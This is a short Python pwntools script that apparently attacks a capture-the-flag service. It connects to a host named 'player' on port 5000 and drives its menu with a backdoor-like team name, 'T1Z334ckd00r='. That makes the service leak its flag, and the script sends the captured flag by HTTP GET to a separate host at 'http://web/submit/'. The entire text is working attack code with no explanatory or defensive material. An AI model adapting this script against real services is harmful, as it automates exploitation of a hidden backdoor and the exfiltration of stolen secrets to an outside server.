#! /usr/bin/env python
import curses
curses.setupterm() 

from pwn import *
import requests

r = remote("player", 5000)

r.sendlineafter("> ", '3')
r.sendafter("Your team name: ","T1Z334ckd00r=")
r.sendlineafter("[y/n] ",'y')
r.sendlineafter("> ", '3')
r.sendafter("Your team name: ","123")
r.sendlineafter("[y/n] ",'n')
r.recvuntil("\n")
flag = r.recvuntil("}")
requests.get("http://web/submit/{}".format(flag))
